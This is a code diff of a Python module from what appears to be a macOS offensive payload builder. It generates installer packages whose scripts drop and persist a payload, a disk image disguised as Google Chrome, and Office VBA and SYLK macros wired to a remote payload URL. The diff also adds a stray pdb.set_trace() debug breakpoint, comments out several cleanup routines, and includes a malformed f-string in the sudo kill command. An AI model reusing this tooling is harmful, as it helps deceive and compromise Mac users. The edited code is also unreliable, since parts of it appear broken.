@@ -1,35 +1,41 @@
 import os
 import dmgbuild
-
+import pdb
 
 def install_pkg(module):
     module.set_scripts_dir('simple-package/scripts')
-
-    src = os.path.join(module.agent.c2.appdir,
+    
+    # create payloads dir
+    module.create_dir(module.full_payloads_dir)
+    dst_path = os.path.join(module.full_payloads_dir, module.payload_name)
+    module.copy_filedir(module.implant_path, dst_path)
+    
+    src = os.path.join(module.appdir,
                        'src/Templates/Installer_Package')
     dst = module.module_root_path
     module.copy_filedir(src, dst)
-
     module.make_executable('simple-package/scripts/preinstall')
     template_file = os.path.join(
         module.module_root_path, 'simple-package/scripts/preinstall')
-    module.update_template('TECHNIQUE_NAME',
-                           module.agent.technique_conversion_name, template_file)
+
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
 
     module.create_dir('simple-package/scripts/files')
     dst = os.path.join(module.module_root_path,
-                       'simple-package/scripts/files/operator-payload')
-    module.copy_filedir(module.agent.payload_destination, dst)
-    module.make_executable('simple-package/scripts/files/operator-payload')
+                       'simple-package/scripts/files', module.payload_name)
 
+    module.copy_filedir(module.payload_destination, dst)
+    module.make_executable(f'simple-package/scripts/files/{module.payload_name}')
+    pdb.set_trace()
     module.generate_payload(
         type='pkgbuild', identifier='com.simple.test', output="install_pkg.pkg")
 
-    cleanup = [
-        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | sudo xargs kill',
-        'sudo rm -f "/Library/Application Support/operator-payload"'
-    ]
-    module.generate_cleanup(cleanup)
+    # cleanup = [
+    #     'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | sudo xargs kill',
+    #     f'sudo rm -f "/Library/Application Support/{module.payload_name}"'
+    # ]
+    # module.generate_cleanup(cleanup)
 
     instructions = ['Run pkg written in Payloads']
     module.generate_instructions(instructions)
@@ -37,8 +43,10 @@ def install_pkg(module):
 
 def install_pkg_postinstall(module):
     module.set_scripts_dir('simple-package/scripts')
+    # create payloads dir
+    module.create_dir(module.full_payloads_dir)
 
-    src = os.path.join(module.agent.c2.appdir,
+    src = os.path.join(module.appdir,
                        'src/Templates/Installer_Package_postinstall')
     dst = module.module_root_path
     module.copy_filedir(src, dst)
@@ -46,21 +54,21 @@ def install_pkg_postinstall(module):
     module.make_executable('simple-package/scripts/postinstall')
     template_file = os.path.join(
         module.module_root_path, 'simple-package/scripts/postinstall')
-    module.update_template('TECHNIQUE_NAME',
-                           module.agent.technique_conversion_name, template_file)
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
 
     module.create_dir('simple-package/scripts/files')
     dst = os.path.join(module.module_root_path,
-                       'simple-package/scripts/files/operator-payload')
-    module.copy_filedir(module.agent.payload_destination, dst)
-    module.make_executable('simple-package/scripts/files/operator-payload')
+                       f'simple-package/scripts/files/{module.payload_name}')
+    module.copy_filedir(module.payload_destination, dst)
+    module.make_executable(f'simple-package/scripts/files/{module.payload_name}')
 
     module.generate_payload(
         type='pkgbuild', identifier='com.simple.test', output="install_pkg_postinstall.pkg")
 
     cleanup = [
-        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | sudo xargs kill',
-        'sudo rm -f "/Library/Application Support/operator-payload"'
+        f"ps aux |grep {module.payload_name} | awk -F "  +" '{print $2}' | sudo xargs kill",
+        f'sudo rm -f "/Library/Application Support/{module.payload_name}"'
     ]
     module.generate_cleanup(cleanup)
 
@@ -71,7 +79,7 @@ def install_pkg_postinstall(module):
 def install_pkg_ld(module):
     module.set_scripts_dir('simple-package/scripts')
 
-    src = os.path.join(module.agent.c2.appdir,
+    src = os.path.join(module.appdir,
                        'src/Templates/Installer_Package_with_LD')
     dst = module.module_root_path
     module.copy_filedir(src, dst)
@@ -80,15 +88,21 @@ def install_pkg_ld(module):
     module.make_executable('simple-package/scripts/postinstall')
 
     template_file = os.path.join(
+        module.module_root_path, 'simple-package/scripts/preinstall')
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
+
+    template_file = os.path.join(
         module.module_root_path, 'simple-package/scripts/files/com.simple.plist')
-    module.update_template('TECHNIQUE_NAME',
-                           module.agent.technique_conversion_name, template_file)
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
+
 
     module.create_dir('simple-package/scripts/files')
     dst = os.path.join(module.module_root_path,
-                       'simple-package/scripts/files/operator-payload')
-    module.copy_filedir(module.agent.payload_destination, dst)
-    module.make_executable('simple-package/scripts/files/operator-payload')
+                       f'simple-package/scripts/files/{module.payload_name}')
+    module.copy_filedir(module.payload_destination, dst)
+    module.make_executable(f'simple-package/scripts/files/{module.payload_name}')
 
     module.generate_payload(
         type='pkgbuild', identifier='com.simple.agent', output="install_pkg_LD.pkg")
@@ -96,7 +110,7 @@ def install_pkg_ld(module):
     cleanup = [
         'sudo launchctl unload /Library/LaunchDaemons/com.simple.agent.plist',
         'sudo rm -f "/Library/LaunchDaemons/com.simple.agent.plist"',
-        'sudo rm -f "/Library/Application Support/operator-payload"'
+        f'sudo rm -f "/Library/Application Support/{module.payload_name}"'
     ]
     module.generate_cleanup(cleanup)
 
@@ -105,7 +119,7 @@ def install_pkg_ld(module):
 
 
 def install_pkg_installer_plugin(module):
-    src = os.path.join(module.agent.c2.appdir,
+    src = os.path.join(module.appdir,
                        'src/Templates/Installer_Plugins')
     dst = module.module_root_path
     module.copy_filedir(src, dst)
@@ -113,9 +127,9 @@ def install_pkg_installer_plugin(module):
     template_file = os.path.join(
         module.module_root_path, 'SpecialDelivery/MyInstallerPane.m')
     module.update_template('REMOTE_PAYLOAD_URL',
-                           module.agent.payload_hosting_url, template_file)
-    module.update_template('TECHNIQUE_NAME',
-                           module.agent.technique_conversion_name, template_file)
+                           module.payload_hosting_url, template_file)
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
 
     module.run_xcodebuild()
 
@@ -136,45 +150,45 @@ def install_pkg_installer_plugin(module):
     output = 'installer_plugin.pkg'
     module.run_pkgbuild(identifier='com.simple.agent',
                         output=output, has_scripts=False)
-    src = os.path.join(module.agent.c2.full_payloads_dir, output)
+    src = os.path.join(module.full_payloads_dir, output)
     dst = os.path.join(module.module_root_path, 'plugins', output)
     module.copy_filedir(src, dst)
     module.generate_payload('productbuild-plugin',
                             identifier='com.simple.agent', output=output)
 
-    cleanup = [
-        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
-        'rm -f "~/Library/Application Support/operator-payload"'
-    ]
-    module.generate_cleanup(cleanup)
+    # cleanup = [
+    #     'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
+    #     'rm -f "~/Library/Application Support/operator-payload"'
+    # ]
+    # module.generate_cleanup(cleanup)
 
     instructions = ['Run pkg written in Payloads']
     module.generate_instructions(instructions)
 
 
 def install_pkg_js_embedded(module):
-    src = os.path.join(module.agent.c2.appdir,
+    src = os.path.join(module.appdir,
                        'src/Templates/Installer_Package_JS')
     dst = module.module_root_path
     module.copy_filedir(src, dst)
 
     template_file = os.path.join(module.module_root_path, 'distribution.xml')
     module.update_template('REMOTE_PAYLOAD_URL',
-                           module.agent.payload_hosting_url, template_file)
-    module.update_template('TECHNIQUE_NAME',
-                           module.agent.technique_conversion_name, template_file)
-
+                           module.payload_hosting_url, template_file)
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
+    
     output = 'installer_js_embedded.pkg'
     module.run_pkgbuild(identifier='com.simple.agent',
                         output=output, has_scripts=False)
     module.generate_payload(
         'productbuild-js', identifier='com.simple.agent', output=output)
 
-    cleanup = [
-        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
-        'rm -f "~/Library/Application Support/operator-payload"'
-    ]
-    module.generate_cleanup(cleanup)
+    # cleanup = [
+    #     'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
+    #     'rm -f "~/Library/Application Support/operator-payload"'
+    # ]
+    # module.generate_cleanup(cleanup)
 
     instructions = ['Run pkg written in Payloads']
     module.generate_instructions(instructions)
@@ -182,7 +196,7 @@ def install_pkg_js_embedded(module):
 
 def install_pkg_js_script(module):
     module.set_scripts_dir('Scripts')
-    src = os.path.join(module.agent.c2.appdir,
+    src = os.path.join(module.appdir,
                        'src/Templates/Installer_Package_JS_Script')
     dst = module.module_root_path
     module.copy_filedir(src, dst)
@@ -191,13 +205,12 @@ def install_pkg_js_script(module):
     module.update_template('templatescript', "installcheck", template_file)
     template_file = os.path.join(
         module.module_root_path, 'Scripts/installcheck')
-    module.update_template('TECHNIQUE_NAME',
-                           module.agent.technique_conversion_name, template_file)
-
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
     template_file = os.path.join(
         module.module_root_path, 'Scripts/installcheck')
     module.update_template('REMOTE_PAYLOAD_URL',
-                           module.agent.payload_hosting_url, template_file)
+                           module.payload_hosting_url, template_file)
     module.make_executable('Scripts/installcheck')
 
     output = 'install_pkg_js_script.pkg'
@@ -206,18 +219,18 @@ def install_pkg_js_script(module):
     module.generate_payload('productbuild-js-script',
                             identifier='com.simple.agent', output=output)
 
-    cleanup = [
-        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
-        'rm -f "~/Library/Application Support/operator-payload"'
-    ]
-    module.generate_cleanup(cleanup)
+    # cleanup = [
+    #     'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
+    #     'rm -f "~/Library/Application Support/operator-payload"'
+    # ]
+    # module.generate_cleanup(cleanup)
 
     instructions = ['Run pkg written in Payloads']
     module.generate_instructions(instructions)
 
 
 def disk_image(module):
-    src = os.path.join(module.agent.c2.appdir, 'src/Templates/DMG')
+    src = os.path.join(module.appdir, 'src/Templates/DMG')
     dst = module.module_root_path
     module.copy_filedir(src, dst)
 
@@ -225,8 +238,8 @@ def disk_image(module):
     module.make_executable(template_file)
     template_file = os.path.join(
         module.module_root_path, template_file)
-    module.update_template('TECHNIQUE_NAME',
-                           module.agent.technique_conversion_name, template_file)
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
 
     src = '/Applications/Google Chrome.app/Contents/Resources/app.icns'
     dst = os.path.join(module.module_root_path,
@@ -234,37 +247,37 @@ def disk_image(module):
     module.copy_filedir(src, dst)
 
     dst = os.path.join(module.module_root_path,
-                       'Chrome.app/Contents/MacOS/operator-payload')
-    module.copy_filedir(module.agent.payload_destination, dst)
-    module.make_executable('Chrome.app/Contents/MacOS/operator-payload')
+                       f'Chrome.app/Contents/MacOS/{module.payload_name}')
+    module.copy_filedir(module.payload_destination, dst)
+    module.make_executable(f'Chrome.app/Contents/MacOS/{module.payload_name}')
 
     os.chdir(module.module_root_path)
     dmgbuild.build_dmg('../../chrome.dmg', 'Chrome App', 'settings.json')
 
-    cleanup = [
-        'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
-        'sudo rm -rf "/Applications/Chrome.app"'
-    ]
+    # cleanup = [
+    #     'ps aux |grep operator-payload | awk -F "  +" \'{print $2}\' | xargs kill',
+    #     'sudo rm -rf "/Applications/Chrome.app"'
+    # ]
 
-    module.generate_cleanup(cleanup)
+    # module.generate_cleanup(cleanup)
 
     instructions = ['Run pkg written in Payloads']
     module.generate_instructions(instructions)
 
 
 def macro_vba_excel(module):
-    src = os.path.join(module.agent.c2.appdir, 'src/Templates/Office_for_Mac')
+    src = os.path.join(module.appdir, 'src/Templates/Office_for_Mac')
     dst = module.module_root_path
     module.copy_filedir(src, dst)
 
     template_file = os.path.join(
         module.module_root_path, 'macro_vba_excel.txt')
     module.update_template('REMOTE_PAYLOAD_URL',
-                           module.agent.payload_hosting_url, template_file)
-    module.update_template('TECHNIQUE_NAME',
-                           module.agent.technique_conversion_name, template_file)
+                           module.payload_hosting_url, template_file)
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
     module.copy_filedir(template_file, os.path.join(
-        module.agent.c2.payloads_dir, 'macro_vba_excel.txt'))
+        module.payloads_dir, 'macro_vba_excel.txt'))
 
     instructions = [
         'Copy the macro from Payloads/macro_vba_excel.txt to paste into Excel Workbook',
@@ -275,17 +288,17 @@ def macro_vba_excel(module):
 
 
 def macro_vba_ppt(module):
-    src = os.path.join(module.agent.c2.appdir, 'src/Templates/Office_for_Mac')
+    src = os.path.join(module.appdir, 'src/Templates/Office_for_Mac')
     dst = module.module_root_path
     module.copy_filedir(src, dst)
 
     template_file = os.path.join(module.module_root_path, 'macro_vba_ppt.txt')
     module.update_template('REMOTE_PAYLOAD_URL',
-                           module.agent.payload_hosting_url, template_file)
-    module.update_template('TECHNIQUE_NAME',
-                           module.agent.technique_conversion_name, template_file)
+                           module.payload_hosting_url, template_file)
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
     module.copy_filedir(template_file, os.path.join(
-        module.agent.c2.payloads_dir, 'macro_vba_ppt.txt'))
+        module.payloads_dir, 'macro_vba_ppt.txt'))
 
     instructions = [
         'Copy the macro from Payloads/macro_vba_ppt.txt to paste into Powerpoint',
@@ -296,17 +309,17 @@ def macro_vba_ppt(module):
 
 
 def macro_vba_word(module):
-    src = os.path.join(module.agent.c2.appdir, 'src/Templates/Office_for_Mac')
+    src = os.path.join(module.appdir, 'src/Templates/Office_for_Mac')
     dst = module.module_root_path
     module.copy_filedir(src, dst)
 
     template_file = os.path.join(module.module_root_path, 'macro_vba_word.txt')
     module.update_template('REMOTE_PAYLOAD_URL',
-                           module.agent.payload_hosting_url, template_file)
-    module.update_template('TECHNIQUE_NAME',
-                           module.agent.technique_conversion_name, template_file)
+                           module.payload_hosting_url, template_file)
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
     module.copy_filedir(template_file, os.path.join(
-        module.agent.c2.payloads_dir, 'macro_vba_word.txt'))
+        module.payloads_dir, 'macro_vba_word.txt'))
 
     instructions = [
         'Copy the macro from Payloads/macro_vba_word.txt to past into Word Doc',
@@ -317,18 +330,18 @@ def macro_vba_word(module):
 
 
 def macro_sylk_excel(module):
-    src = os.path.join(module.agent.c2.appdir, 'src/Templates/Office_for_Mac')
+    src = os.path.join(module.appdir, 'src/Templates/Office_for_Mac')
     dst = module.module_root_path
     module.copy_filedir(src, dst)
 
     template_file = os.path.join(
         module.module_root_path, 'macro_sylk_excel.txt')
     module.update_template('REMOTE_PAYLOAD_URL',
-                           module.agent.payload_hosting_url, template_file)
-    module.update_template('TECHNIQUE_NAME',
-                           module.agent.technique_conversion_name, template_file)
+                           module.payload_hosting_url, template_file)
+    module.update_template('PAYLOAD_NAME',
+                           module.payload_name, template_file)
     module.copy_filedir(template_file, os.path.join(
-        module.agent.c2.payloads_dir, 'macro_sylk_excel.slk'))
+        module.payloads_dir, 'macro_sylk_excel.slk'))
 
     instructions = [
         'Double click on the Payloads/macro_sylk_excel.slk file.',
